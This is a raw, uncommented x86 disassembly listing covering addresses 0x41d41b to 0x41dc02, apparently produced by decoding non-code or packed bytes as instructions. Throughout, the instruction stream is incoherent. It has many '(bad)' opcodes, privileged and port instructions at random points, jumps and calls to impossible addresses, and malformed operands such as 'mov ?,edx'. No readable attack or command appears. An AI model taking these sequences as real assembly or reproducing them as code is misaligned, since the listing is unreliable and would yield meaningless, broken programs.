  41d41b:	add    al,0x0
  41d41d:	add    BYTE PTR [edi-0x63],dh
  41d420:	ret    0x6345
  41d423:	add    eax,0x23045c3
  41d428:	add    BYTE PTR [eax],al
  41d42a:	jne    0x41d3d5
  41d42c:	jp     0x41d470
  41d42e:	and    DWORD PTR gs:[esi],edi
  41d431:	or     ecx,edi
  41d433:	lods   eax,DWORD PTR ds:[esi]
  41d434:	jne    0x41d478
  41d436:	cmp    ecx,0xfa494274
  41d43c:	rol    DWORD PTR [edx+0x71],0xa6
  41d440:	mov    esi,0x98a96b42
  41d445:	jb     0x41d485
  41d447:	stos   BYTE PTR es:[edi],al
  41d448:	add    BYTE PTR [ecx-0x407c8a50],cl
  41d44e:	jns    0x41d429
  41d450:	je     0x41d494
  41d452:	sbb    edx,edi
  41d454:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d455:	jb     0x41d4d4
  41d457:	jno    0x41d4cf
  41d459:	pop    edx
  41d45a:	jmp    0xf769:0xf9c6f418
  41d461:	xchg   edx,eax
  41d462:	mov    ah,0x14
  41d464:	ret    0xc6
  41d467:	add    BYTE PTR [eax],al
  41d469:	add    BYTE PTR [eax],al
  41d46b:	mov    bh,0x99
  41d46d:	add    BYTE PTR [ebx-0x2],dl
  41d470:	inc    ebp
  41d471:	sub    bl,0xc5
  41d474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d475:	add    BYTE PTR [eax],al
  41d477:	es jg  0x41d4f5
  41d47a:	jb     0x41d4f9
  41d47c:	js     0x41d4cc
  41d47e:	call   0x4231ff
  41d483:	data16 loop 0x41d46a
  41d486:	add    DWORD PTR [edx+0x1d],ebp
  41d489:	ret    0xae30
  41d48c:	pop    esp
  41d48d:	sbb    bh,bh
  41d48f:	stc    
  41d490:	outs   dx,BYTE PTR ds:[esi]
  41d491:	stos   DWORD PTR es:[edi],eax
  41d492:	dec    edi
  41d493:	out    dx,al
  41d494:	(bad)  
  41d496:	dec    edx
  41d497:	xchg   ebp,eax
  41d498:	icebp  
  41d499:	mov    WORD PTR [ebx+0x72],ds
  41d49c:	mov    al,ds:0x2d7abf7d
  41d4a1:	inc    ebx
  41d4a2:	add    dh,BYTE PTR [ebp-0x57]
  41d4a5:	call   0xf6443304
  41d4aa:	jg     0x41d437
  41d4ac:	add    al,0xe7
  41d4ae:	add    edi,DWORD PTR [eax+0x58]
  41d4b1:	sub    ebp,DWORD PTR [ebx-0x7ea3cd5b]
  41d4b7:	out    0x9d,al
  41d4b9:	lds    esp,FWORD PTR [edi+0x4837aac2]
  41d4bf:	sub    BYTE PTR [edi-0x798e3b96],bl
  41d4c5:	int    0x1
  41d4c7:	jne    0x41d4cb
  41d4c9:	imul   BYTE PTR [ebp-0x49]
  41d4cc:	fwait
  41d4cd:	xchg   ecx,eax
  41d4ce:	cli    
  41d4cf:	add    BYTE PTR [eax],al
  41d4d1:	add    BYTE PTR [eax],al
  41d4d3:	add    BYTE PTR [edx-0x16fe8d26],dh
  41d4d9:	popf   
  41d4da:	lea    esp,[edi-0x3d3e227a]
  41d4e0:	addr16 xchg esp,eax
  41d4e2:	mov    ecx,0xd1b9e1c3
  41d4e7:	ret    
  41d4e8:	xchg   edi,eax
  41d4e9:	add    ch,al
  41d4eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4ec:	fstp   DWORD PTR [esi-0x15]
  41d4ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4f0:	rcr    BYTE PTR [esi+0x5779bee9],cl
  41d4f6:	es jge 0x41d530
  41d4f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4fa:	rol    BYTE PTR [ecx],0xee
  41d4fd:	inc    esp
  41d4fe:	dec    ebx
  41d4ff:	push   esp
  41d500:	dec    ebx
  41d501:	stos   BYTE PTR es:[edi],al
  41d502:	dec    ebp
  41d503:	dec    eax
  41d504:	test   al,0x9e
  41d506:	push   0xffffffc4
  41d508:	jno    0x41d490
  41d50a:	or     eax,0x8d027505
  41d50f:	in     al,dx
  41d510:	xsha256 (bad)
  41d511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d512:	xchg   ebx,eax
  41d513:	adc    eax,ebp
  41d515:	add    BYTE PTR [eax],al
  41d517:	rol    BYTE PTR [ebx-0x9871962],1
  41d51d:	add    al,0x5b
  41d51f:	test   al,0x71
  41d521:	sahf   
  41d522:	adc    esp,eax
  41d524:	lds    ebp,FWORD PTR [eax]
  41d526:	add    ch,ch
  41d528:	fld    QWORD PTR [eax-0x3c]
  41d52b:	cdq    
  41d52c:	fistp  WORD PTR [edi-0x59ddbb79]
  41d532:	add    DWORD PTR ds:0xa9839f12,edi
  41d538:	add    BYTE PTR [eax],al
  41d53a:	add    BYTE PTR [eax],al
  41d53c:	add    BYTE PTR [ebx-0x7e],cl
  41d53f:	scas   eax,DWORD PTR es:[edi]
  41d540:	call   0x44c1d7bb
  41d545:	xor    eax,0xc8640d01
  41d54a:	pushf  
  41d54b:	cld    
  41d54c:	jmp    0xe9221621
  41d551:	dec    edx
  41d552:	repnz les ebp,FWORD PTR [ecx+eiz*4]
  41d556:	idiv   bh
  41d558:	call   0x55849cd3
  41d55d:	je     0x41d561
  41d55f:	add    cl,ch
  41d561:	fisttp WORD PTR [edi]
  41d563:	lds    ebp,FWORD PTR [ecx+eiz*2]
  41d566:	add    eax,DWORD PTR [eax]
  41d568:	jmp    0x35849ce3
  41d56d:	jae    0x41d571
  41d56f:	add    cl,ch
  41d571:	jecxz  0x41d5ca
  41d573:	inc    edx
  41d574:	mov    cs,WORD PTR cs:[ebx+0x42600532]
  41d57b:	add    BYTE PTR [eax+0x2d],ah
  41d57e:	mov    edx,0x9d64650c
  41d583:	cld    
  41d584:	jmp    0xafb61ff7
  41d589:	outs   dx,BYTE PTR ds:[esi]
  41d58a:	jae    0x444f5a
  41d590:	bound  ecx,QWORD PTR [ebp+0xa]
  41d593:	push   ecx
  41d594:	xchg   ebx,eax
  41d595:	mov    WORD PTR [edx-0x3612c03],ax
  41d59c:	mov    ecx,0xe587ade
  41d5a1:	add    BYTE PTR [eax],al
  41d5a3:	add    BYTE PTR [eax],al
  41d5a5:	add    bl,dl
  41d5a7:	cmp    DWORD PTR [edi+0x461d6b00],0x6a015c01
  41d5b1:	and    dh,dh
  41d5b3:	cwde   
  41d5b4:	sti    
  41d5b5:	xor    eax,0x3fcf84
  41d5ba:	pop    ebx
  41d5bb:	int3   
  41d5bc:	test   DWORD PTR [ebp+0x34],eax
  41d5bf:	stos   DWORD PTR es:[edi],eax
  41d5c0:	mov    edi,0xfc6ad00f
  41d5c5:	dec    DWORD PTR [ebx+edi*8+0x12]
  41d5c9:	pop    ecx
  41d5ca:	ret    0x519
  41d5cd:	push   0x4c
  41d5cf:	adc    al,0x8a
  41d5d1:	sbb    al,0xeb
  41d5d3:	data16 sti 
  41d5d5:	or     esp,0xffffff9d
  41d5d8:	in     eax,0xfa
  41d5da:	sbb    al,0x1
  41d5dc:	add    BYTE PTR [ebx+0x6a4f9e69],cl
  41d5e2:	or     eax,0x3cf64214
  41d5e7:	jle    0x41d63c
  41d5e9:	pop    ebx
  41d5ea:	sti    
  41d5eb:	data16 add al,0xdb
  41d5ef:	sbb    al,0x2
  41d5f1:	add    esp,ecx
  41d5f3:	add    BYTE PTR [eax],bh
  41d5f5:	pop    ebp
  41d5f6:	bound  edx,QWORD PTR [edi+0xdcfc80]
  41d5fc:	add    BYTE PTR [edi],cl
  41d5fe:	loop   0x41d5dc
  41d600:	cmc    
  41d601:	push   ebx
  41d602:	cld    
  41d603:	adc    eax,DWORD PTR [edx-0x498d8ec]
  41d609:	push   eax
  41d60a:	add    BYTE PTR [eax],al
  41d60c:	add    BYTE PTR [eax],al
  41d60e:	add    BYTE PTR [edx+edx*4+0x57],al
  41d612:	jmp    FWORD PTR [ebx-0x7e]
  41d615:	mov    esp,0xfc60100f
  41d61a:	dec    DWORD PTR [ebp+edx*4+0x1e7245b2]
  41d621:	cdq    
  41d622:	add    eax,0xfffb6980
  41d627:	jne    0x41d64f
  41d629:	cmp    eax,0x4f5825c8
  41d62e:	mov    edi,eax
  41d630:	mov    ebp,0x7a6afca7
  41d635:	jns    0x41d691
  41d637:	sub    eax,0x80d40d95
  41d63c:	imul   eax,DWORD PTR [eax],0xf93e3583
  41d642:	lds    esi,FWORD PTR [eax-0x2319034c]
  41d648:	test   eax,0x57870000
  41d64d:	ja     0x41d691
  41d64f:	cmp    eax,0x8673bf01
  41d654:	lods   al,BYTE PTR ds:[esi]
  41d655:	push   0xffffffc9
  41d657:	out    dx,al
  41d658:	in     eax,0x74
  41d65a:	mov    bh,0x5c
  41d65c:	loope  0x41d65d
  41d65e:	jae    0x41d6d0
  41d660:	adc    BYTE PTR [ecx+0x1c],al
  41d663:	dec    esi
  41d664:	push   0x6803f42d
  41d669:	cmp    cl,0x77
  41d66c:	test   edx,0xfd1c38c5
  41d672:	cld    
  41d673:	add    BYTE PTR [eax],al
  41d675:	add    BYTE PTR [eax],al
  41d677:	add    BYTE PTR [eax+0x51],ah
  41d67a:	mov    ds:0x40bb9112,eax
  41d67f:	add    dh,cl
  41d681:	add    al,0xa3
  41d683:	outs   dx,DWORD PTR ds:[esi]
  41d684:	gs and al,0x31
  41d687:	sbb    ch,bl
  41d689:	es mov edx,0x3e22c2ff
  41d68f:	fdivr  DWORD PTR [esi-0x18]
  41d692:	sub    eax,0xab6ebb06
  41d697:	(bad)  
  41d698:	lahf   
  41d699:	(bad)  
  41d69a:	sbb    al,BYTE PTR [ecx-0x2ad243a3]
  41d6a0:	in     al,dx
  41d6a1:	jno    0x41d6ab
  41d6a3:	xchg   DWORD PTR ds:0xb998eb02,ebp
  41d6a9:	xchg   DWORD PTR [ebx-0x14d7da05],ebx
  41d6af:	jbe    0x41d6e8
  41d6b1:	push   esi
  41d6b2:	mov    dh,0x9b
  41d6b4:	or     DWORD PTR [eax],edi
  41d6b6:	push   es
  41d6b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6b8:	test   cl,0x72
  41d6bb:	cmp    cl,bh
  41d6bd:	test   BYTE PTR [eax+0xed559fb],0xcd
  41d6c4:	mov    ch,0x2
  41d6c6:	out    0xba,al
  41d6c8:	repz inc esp
  41d6ca:	mov    edi,0xed1535df
  41d6cf:	leave  
  41d6d0:	mov    bh,0x93
  41d6d2:	out    0xae,eax
  41d6d4:	xchg   DWORD PTR [eax],ebp
  41d6d6:	jmp    0xeecb6a17
  41d6db:	sub    eax,0x0
  41d6e0:	add    BYTE PTR [ecx-0x73],bh
  41d6e3:	and    ebx,DWORD PTR [eax-0xb]
  41d6e6:	shl    edx,0x34
  41d6e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6ea:	stos   BYTE PTR es:[edi],al
  41d6eb:	popf   
  41d6ec:	int3   
  41d6ed:	or     bl,BYTE PTR [ebx+0x2f6d2171]
  41d6f3:	add    DWORD PTR [esi],eax
  41d6f5:	out    dx,al
  41d6f6:	inc    esp
  41d6f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6f8:	xor    al,0xdd
  41d6fa:	xor    esp,DWORD PTR [ecx]
  41d6fc:	mov    ds:0x19a685e9,eax
  41d701:	jb     0x41d69e
  41d703:	sti    
  41d704:	mov    ebx,0x49e61d2
  41d709:	jne    0x41d6db
  41d70b:	es inc ebx
  41d70d:	sub    esi,DWORD PTR [edi]
  41d70f:	xor    dh,al
  41d711:	jbe    0x41d715
  41d713:	sub    eax,0xf00bc49
  41d718:	inc    ecx
  41d719:	test   al,0xa
  41d71b:	ins    BYTE PTR es:[edi],dx
  41d71c:	in     al,0x70
  41d71e:	add    ah,bh
  41d720:	sub    esp,ebp
  41d722:	inc    esp
  41d723:	add    BYTE PTR [ecx],ch
  41d725:	jmp    0x245:0x1c7d80f
  41d72c:	imul   BYTE PTR [eax+eax*2]
  41d72f:	ret    
  41d730:	mov    cl,0x67
  41d732:	xchg   BYTE PTR [edi+0x480276ec],bh
  41d738:	fdivp  st(2),st
  41d73a:	repz add ch,cl
  41d73d:	jbe    0x41d789
  41d73f:	je     0x41d731
  41d741:	sub    al,0x45
  41d743:	cmc    
  41d744:	out    dx,al
  41d745:	add    BYTE PTR [eax],al
  41d747:	add    BYTE PTR [eax],al
  41d749:	add    BYTE PTR [ecx],cl
  41d74b:	pop    DWORD PTR [edx]
  41d74d:	jmp    0xe9c131c8
  41d752:	jbe    0x41d756
  41d754:	xchg   DWORD PTR [ecx+ebp*4],esp
  41d757:	add    BYTE PTR [edx-0x7b],0xe5
  41d75b:	inc    esp
  41d75c:	mov    al,0x39
  41d75e:	add    al,0x85
  41d760:	sub    eax,esi
  41d762:	xlat   BYTE PTR ds:[ebx]
  41d763:	xchg   esi,eax
  41d764:	dec    edi
  41d765:	push   ss
  41d766:	(bad)  
  41d767:	hlt    
  41d768:	jecxz  0x41d746
  41d76a:	mov    dh,0x2
  41d76c:	sub    DWORD PTR [ecx-0x12287a99],0x76
  41d773:	add    cl,BYTE PTR [ebx-0x74b67adc]
  41d779:	ins    BYTE PTR es:[edi],dx
  41d77a:	add    bl,BYTE PTR [esi+0x2fa68efc]
  41d780:	std    
  41d781:	fcomp  QWORD PTR [edx]
  41d783:	cmc    
  41d784:	aas    
  41d785:	jmp    0x6c4e3177
  41d78a:	push   esp
  41d78b:	add    eax,0x839ce900
  41d790:	mov    edx,0xfc971615
  41d795:	test   BYTE PTR [ecx+eax*4-0x68e9f87e],0xfc
  41d79d:	aam    0x82
  41d79f:	sbb    DWORD PTR [edx-0x49b2800],0x2c8225ff
  41d7a9:	jmp    DWORD PTR [ebx+0x64]
  41d7ac:	mov    DWORD PTR [ebp+0x0],esi
  41d7b2:	add    BYTE PTR [eax+0x64fffb64],dl
  41d7b8:	sbb    eax,0x8663ff5a
  41d7bd:	inc    ecx
  41d7be:	call   0x103d54d2
  41d7c3:	fadd   DWORD PTR [edi-0x12a40000]
  41d7c9:	(bad)  
  41d7ca:	dec    DWORD PTR [ebp+0x5]
  41d7cd:	push   0x8
  41d7cf:	arpl   WORD PTR [ecx+0x51fd6d4],si
  41d7d5:	sti    
  41d7d6:	adc    eax,0x3c9578
  41d7db:	(bad)  
  41d7dc:	jbe    0x41d815
  41d7de:	sti    
  41d7df:	cdq    
  41d7e0:	or     eax,0x54b45c6
  41d7e5:	in     eax,0x60
  41d7e7:	sbb    BYTE PTR ds:0x5e69ff00,al
  41d7ed:	xchg   DWORD PTR [ebp+0x14],esi
  41d7f0:	into   
  41d7f1:	cli    
  41d7f2:	jne    0x41d828
  41d7f4:	fsubr  st(7),st
  41d7f6:	(bad)  
  41d7f7:	xlat   BYTE PTR ds:[ebx]
  41d7f8:	(bad)  
  41d7f9:	sti    
  41d7fa:	adc    esp,0x4
  41d7fd:	or     eax,DWORD PTR [ebp+0x11f]
  41d803:	push   edi
  41d804:	inc    ecx
  41d805:	call   0xfb94798d
  41d80a:	adc    DWORD PTR [ecx-0x62],0xfffffffa
  41d80e:	jmp    DWORD PTR [ebx+0x63]
  41d811:	test   DWORD PTR [ebp-0x14],ebx
  41d814:	mov    WORD PTR [ecx-0x24],ds
  41d817:	add    BYTE PTR [eax],al
  41d819:	add    BYTE PTR [eax],al
  41d81b:	add    BYTE PTR [ebp-0x27],al
  41d81e:	jecxz  0x41d7e7
  41d820:	pop    ecx
  41d821:	call   0x6:0x3075fffa
  41d828:	jne    0x41d7d5
  41d82a:	mov    DWORD PTR [edx-0x360be73],esi
  41d830:	in     al,dx
  41d831:	sbb    eax,0xcf9afe00
  41d836:	test   al,0xdd
  41d838:	jbe    0x41d7e5
  41d83a:	add    ch,bh
  41d83c:	add    BYTE PTR [ebx-0x6967d73],dl
  41d842:	sahf   
  41d843:	cld    
  41d844:	(bad)  
  41d845:	idiv   DWORD PTR [ebx]
  41d847:	std    
  41d848:	jb     0x41d868
  41d84a:	les    esi,FWORD PTR [ebx-0x73]
  41d84d:	jl     0x41d877
  41d84f:	std    
  41d850:	bound  ebp,QWORD PTR [edx+0x175a5500]
  41d856:	or     ebp,edi
  41d858:	push   0x753ff6c9
  41d85d:	ror    DWORD PTR es:[ebx+esi*8],0x66
  41d862:	add    eax,DWORD PTR [eax]
  41d864:	jne    0x41d816
  41d866:	adc    eax,0xf51f00e8
  41d86b:	std    
  41d86c:	sub    al,cl
  41d86e:	mov    DWORD PTR [edx+0x25],0x7500012a
  41d875:	rol    esi,0x57
  41d878:	adc    ch,BYTE PTR [ecx-0x7c]
  41d87b:	mov    edi,0x162257a
  41d880:	add    BYTE PTR [eax],al
  41d882:	add    BYTE PTR [eax],al
  41d884:	add    BYTE PTR [ebp-0x57],dh
  41d887:	lea    eax,[edx+0x5]
  41d88a:	fimul  DWORD PTR [edx+eax*4-0x360775f]
  41d891:	inc    ebp
  41d892:	cld    
  41d893:	sub    edi,ebp
  41d895:	loop   0x41d840
  41d897:	add    BYTE PTR [ebp-0x26],dl
  41d89a:	xchg   esi,eax
  41d89b:	test   al,0xfc
  41d89d:	push   0x753ff581
  41d8a2:	add    dh,BYTE PTR [edx-0x6d]
  41d8a5:	sti    
  41d8a6:	or     eax,0x7c5dc33
  41d8ab:	mov    esi,DWORD PTR gs:[ebp+0x2]
  41d8af:	out    0x84,eax
  41d8b1:	test   al,0x0
  41d8b3:	test   BYTE PTR [ebp+0x3e70412],0x13
  41d8ba:	mov    ebp,DWORD PTR [ebx-0x11]
  41d8bd:	xchg   ecx,eax
  41d8be:	xchg   edi,eax
  41d8bf:	sub    eax,0xfa7d4229
  41d8c4:	lahf   
  41d8c5:	adc    DWORD PTR [edi+0x41e86ed],0x83db03e7
  41d8cf:	push   cs
  41d8d0:	add    eax,0x867208e6
  41d8d5:	mov    dl,BYTE PTR [esi+0x7d9d9ffd]
  41d8db:	mov    dh,0xa0
  41d8dd:	push   ecx
  41d8de:	xchg   edi,eax
  41d8df:	add    esp,edi
  41d8e1:	rol    BYTE PTR [ebx-0x4380822],1
  41d8e7:	push   eax
  41d8e8:	hlt    
  41d8e9:	add    BYTE PTR [eax],al
  41d8eb:	add    BYTE PTR [eax],al
  41d8ed:	add    bh,ch
  41d8ef:	jl     0x41d90b
  41d8f1:	lahf   
  41d8f2:	xor    DWORD PTR [edi-0x69716ea5],edx
  41d8f8:	lds    ebx,FWORD PTR [edi+0x4a5851a]
  41d8fe:	jne    0x41d97d
  41d900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d901:	psadbw mm3,mm6
  41d904:	call   0x25c44e0c
  41d909:	add    dh,BYTE PTR [ebp+0x7]
  41d90c:	add    DWORD PTR fs:[edi+0x2],esi
  41d910:	out    0x25,eax
  41d912:	stos   BYTE PTR es:[edi],al
  41d913:	neg    ebp
  41d915:	mov    BYTE PTR [esi-0x55fc18fc],al
  41d91b:	xor    eax,0x97a71983
  41d920:	(bad)  
  41d921:	sti    
  41d922:	out    0x8b,al
  41d924:	cmp    BYTE PTR [ebp-0x46036a15],0xe5
  41d92b:	adc    DWORD PTR [ebx+0x4f95da5c],0x41
  41d932:	ret    
  41d933:	mov    esp,0x8150e8ff
  41d938:	mov    edx,0xfc95d45d
  41d93d:	(bad)  
  41d93e:	jge    0x41d946
  41d940:	xchg   DWORD PTR [ebp+eax*1-0x64],edx
  41d944:	cld    
  41d945:	cs clc 
  41d947:	jnp    0x41d8e0
  41d949:	and    al,0xe2
  41d94b:	xchg   ebp,eax
  41d94c:	mov    BYTE PTR [esi+eiz*8+0xd427f],ah
  41d953:	add    BYTE PTR [eax],al
  41d955:	add    BYTE PTR [eax],al
  41d957:	mov    eax,ds:0x76e8ff82
  41d95c:	mov    DWORD PTR [edx-0x368fc2b],eax
  41d962:	call   0xd648:0x991297a6
  41d969:	(bad)  
  41d96a:	frstor [eax+0x3a6a013e]
  41d970:	or     cl,BYTE PTR [eax-0x12]
  41d973:	repnz xchg ecx,eax
  41d975:	(bad)  
  41d976:	call   0x558a23f1
  41d97b:	dec    edi
  41d97c:	ds or  eax,0xfc94c96c
  41d982:	jmp    0xe657717e
  41d987:	add    BYTE PTR [esi-0x2],bl
  41d98a:	call   0x41570205
  41d98f:	pop    ebx
  41d990:	jge    0x41d914
  41d992:	int    0xdb
  41d994:	xchg   esi,eax
  41d995:	cld    
  41d996:	add    ebp,ecx
  41d998:	mov    BYTE PTR [ebp+eiz*8-0x5a],al
  41d99c:	mov    DWORD PTR [edx-0x48ae000],eax
  41d9a2:	(bad)  
  41d9a3:	jl     0x41d962
  41d9a5:	inc    ecx
  41d9a6:	lock test al,0x1
  41d9a9:	add    BYTE PTR [eax],al
  41d9ab:	hlt    
  41d9ac:	fcmovnb st,st(5)
  41d9ae:	add    ah,cl
  41d9b0:	jmp    0x41d9c5
  41d9b2:	jmp    0x41dae7
  41d9b7:	push   ss
  41d9b8:	cmp    al,0x4
  41d9ba:	test   BYTE PTR [eax],al
  41d9bc:	add    BYTE PTR [eax],al
  41d9be:	add    BYTE PTR [eax],al
  41d9c0:	pop    esp
  41d9c1:	add    al,0x84
  41d9c3:	jae    0x41d952
  41d9c5:	add    DWORD PTR [eax],eax
  41d9c7:	mov    cr0,ecx
  41d9ca:	mov    DWORD PTR [eax-0x5d],ecx
  41d9cd:	mov    eax,0xea2a0fed
  41d9d2:	cld    
  41d9d3:	dec    DWORD PTR [ecx+edx*8-0x316eb078]
  41d9da:	mov    BYTE PTR [ebp-0x48a10],cl
  41d9e0:	sub    eax,0x4cc62569
  41d9e5:	add    esi,eax
  41d9e7:	test   BYTE PTR [ecx+0xd],dl
  41d9ea:	stc    
  41d9eb:	dec    DWORD PTR [ebx+0x0]
  41d9ee:	mov    DWORD PTR [eax+0x51],ebx
  41d9f1:	mov    al,0xbc
  41d9f3:	lea    ecx,[ecx+0x7c504db2]
  41d9f9:	mov    DWORD PTR [ecx-0x34],eax
  41d9fc:	cdq    
  41d9fd:	jge    0x41d98f
  41d9ff:	cld    
  41da00:	cmp    esi,DWORD PTR [edi+0x4c]
  41da03:	inc    DWORD PTR [ecx+0x4d]
  41da06:	adc    DWORD PTR [eax+0xc],eax
  41da09:	jl     0x41d9c7
  41da0b:	pop    fs
  41da0d:	test   eax,0xb31cfffd
  41da12:	into   
  41da13:	xor    esp,edx
  41da15:	mov    al,BYTE PTR [ecx-0x34]
  41da18:	pop    ss
  41da19:	mov    edi,0x9c751370
  41da1e:	push   edx
  41da1f:	leave  
  41da20:	(bad)  
  41da21:	test   BYTE PTR [edi+esi*4+0x0],0x0
  41da29:	pushf  
  41da2a:	rol    DWORD PTR [edi],cl
  41da2c:	je     0x41d9b4
  41da2e:	adc    BYTE PTR [esp+ebx*1-0x72],al
  41da32:	gs adc al,0xf4
  41da35:	retf   
  41da36:	push   0xb977f983
  41da3b:	mov    ebx,0xaabae6
  41da40:	add    dh,bh
  41da42:	(bad)  
  41da43:	lock dec esi
  41da45:	cld    
  41da46:	jne    0x41d9d8
  41da48:	cld    
  41da49:	and    eax,0x49828da3
  41da4e:	aam    0x9a
  41da50:	cld    
  41da51:	and    eax,0x75c25e43
  41da56:	stos   DWORD PTR es:[edi],eax
  41da57:	and    al,BYTE PTR [ecx-0x3645140]
  41da5d:	jp     0x41d9ea
  41da5f:	adc    eax,0x4836fc0c
  41da64:	std    
  41da65:	push   0x5
  41da67:	mov    DWORD PTR [edx-0x365035b],esi
  41da6d:	pop    edx
  41da6e:	bswap  ebp
  41da70:	cld    
  41da71:	push   0x753ff2bd
  41da76:	add    bl,ch
  41da78:	add    BYTE PTR [ebx-0x70],0xb
  41da7c:	mov    ?,edx
  41da7e:	test   eax,0xa79f0000
  41da83:	cmp    BYTE PTR [esi-0x4],ah
  41da86:	push   ds
  41da87:	in     eax,dx
  41da88:	cld    
  41da89:	and    bh,BYTE PTR [ebp+0x426]
  41da8f:	add    BYTE PTR [eax],al
  41da91:	add    al,ch
  41da93:	fadd   QWORD PTR [edi]
  41da95:	push   eax
  41da96:	add    BYTE PTR [edi],ah
  41da98:	sar    esp,1
  41da9a:	or     ah,BYTE PTR [ebp+0x30]
  41da9d:	lds    edi,FWORD PTR [eax-0x50c68fe]
  41daa3:	xchg   ebx,eax
  41daa4:	out    0xab,al
  41daa6:	arpl   WORD PTR [ebp+0xa5f03e6],di
  41daac:	xor    ah,BYTE PTR [esi]
  41daae:	in     al,dx
  41daaf:	(bad)  
  41dab0:	in     eax,0x80
  41dab2:	mov    ch,0x0
  41dab4:	push   0x1e
  41dab6:	loope  0x41da4b
  41dab8:	or     al,0x8b
  41daba:	mul    esp
  41dabc:	ins    DWORD PTR es:[edi],dx
  41dabd:	pushf  
  41dabe:	ror    DWORD PTR ds:0x2f52bbc,0xe7
  41dac5:	add    edi,esi
  41dac7:	jge    0x41dac3
  41dac9:	sahf   
  41daca:	test   eax,0x4503c093
  41dacf:	xchg   ebx,eax
  41dad0:	(bad)  [ebx]
  41dad2:	add    DWORD PTR [edx-0x19],0x25
  41dad6:	cld    
  41dad7:	jge    0x41dadb
  41dad9:	popf   
  41dada:	mov    DWORD PTR [ebx-0x1108753c],edx
  41dae0:	and    ebx,DWORD PTR [ecx+edi*2-0xa3ca9fd]
  41dae7:	mov    ebp,0xee278ee2
  41daec:	or     ebx,DWORD PTR [ecx+eiz*2+0x52bfab89]
  41daf3:	jl     0x41da95
  41daf5:	pushf  
  41daf6:	add    BYTE PTR [eax],al
  41daf8:	add    BYTE PTR [eax],al
  41dafa:	add    BYTE PTR [ecx-0x77],dl
  41dafd:	stos   DWORD PTR es:[edi],eax
  41dafe:	scas   eax,DWORD PTR es:[edi]
  41daff:	cmc    
  41db00:	cdq    
  41db01:	in     eax,dx
  41db02:	or     edi,ecx
  41db04:	das    
  41db05:	call   0xa711500d
  41db0a:	xchg   DWORD PTR [edi+0x60afdb6],ebp
  41db10:	ret    0x871e
  41db13:	inc    edx
  41db14:	push   es
  41db15:	push   0xffffffc4
  41db17:	ins    BYTE PTR es:[edi],dx
  41db18:	mov    DWORD PTR [ebx],esp
  41db1a:	mov    ah,0x4b
  41db1c:	xor    eax,0xe96f9d00
  41db21:	or     al,0x76
  41db23:	hlt    
  41db24:	out    0xfc,al
  41db26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db27:	fmulp  st(3),st
  41db29:	inc    edx
  41db2a:	mov    ebp,0x1cfcf584
  41db2f:	add    DWORD PTR [eax-0x6a00427e],ecx
  41db35:	cld    
  41db36:	sbb    edx,ebp
  41db38:	aas    
  41db39:	aam    0x13
  41db3b:	jns    0x41db26
  41db3d:	rcr    BYTE PTR [ecx],0xfc
  41db40:	(bad)  
  41db41:	sbb    al,0x19
  41db43:	fimul  WORD PTR [edi]
  41db45:	in     al,dx
  41db46:	les    si,DWORD PTR [edx-0x7e8956ee]
  41db4d:	jp     0x41db94
  41db4f:	push   cs
  41db50:	push   es
  41db51:	test   BYTE PTR [edi+0x46000279],cl
  41db57:	test   BYTE PTR [esi-0x6b7a9b76],ah
  41db5d:	cld    
  41db5e:	add    BYTE PTR ss:[eax],al
  41db61:	add    BYTE PTR [eax],al
  41db63:	add    cl,bl
  41db65:	call   DWORD PTR [ebp+0x2e]
  41db68:	fidivr WORD PTR [esi-0x41]
  41db6b:	idiv   dl
  41db6d:	pop    edx
  41db6e:	(bad)  
  41db6f:	call   0x39b456ea
  41db74:	cld    
  41db75:	inc    esp
  41db76:	lock mov ecx,0x62b84ed
  41db7c:	dec    BYTE PTR [esi+0x3313ba4f]
  41db82:	mov    eax,0xfc91eff6
  41db87:	ret    0x4234
  41db8a:	mov    ebp,ebp
  41db8c:	daa    
  41db8d:	inc    edx
  41db8e:	std    
  41db8f:	push   esp
  41db90:	fisttp QWORD PTR [esi-0x2dda3eee]
  41db96:	call   DWORD PTR [ecx]
  41db98:	cmp    cl,BYTE PTR [edi]
  41db9a:	or     al,0x0
  41db9c:	and    esi,DWORD PTR ds:0x6cd32c8a
  41dba2:	sti    
  41dba3:	cmp    DWORD PTR [ecx+0x4a],edx
  41dba6:	jno    0x41dc1c
  41dba8:	(bad)  
  41dba9:	mov    esi,0x7e038962
  41dbae:	dec    ebx
  41dbaf:	add    bh,BYTE PTR [edx-0x77]
  41dbb2:	mov    ecx,0xfb6d032c
  41dbb7:	pop    ss
  41dbb8:	ret    
  41dbb9:	adc    bh,BYTE PTR [esi-0x2279da02]
  41dbbf:	add    edx,DWORD PTR [edx-0x3a]
  41dbc2:	jg     0x41dc41
  41dbc4:	loopne 0x41db5a
  41dbc6:	test   BYTE PTR [edi+0x0],cl
  41dbc9:	add    BYTE PTR [eax],al
  41dbcb:	add    BYTE PTR [eax],al
  41dbcd:	iret   
  41dbce:	repnz or DWORD PTR [edx-0x44],ebp
  41dbd2:	jp     0x41db5d
  41dbd4:	xor    al,0x53
  41dbd6:	ins    BYTE PTR es:[edi],dx
  41dbd7:	sti    
  41dbd8:	jmp    0x41db6c
  41dbda:	mov    BYTE PTR [ecx-0x24],bh
  41dbdd:	mov    ?,edx
  41dbdf:	cmp    al,0x6a
  41dbe1:	mov    BYTE PTR [edx-0x77],bh
  41dbe4:	xor    BYTE PTR [ebx+0x6c],dl
  41dbe7:	sti    
  41dbe8:	push   ecx
  41dbe9:	adc    DWORD PTR [esp+eax*1],edi
  41dbec:	push   ecx
  41dbed:	xor    al,0xaf
  41dbef:	rol    BYTE PTR [eax],0x8c
  41dbf2:	fild   WORD PTR [ecx]
  41dbf4:	(bad)  
  41dbf5:	loope  0x41db92
  41dbf7:	sti    
  41dbf8:	inc    DWORD PTR [ebx+0x4b4c88d6]
  41dbfe:	imul   ecx,DWORD PTR [ebp-0x18],0x2b
  41dc02:	push   ecx
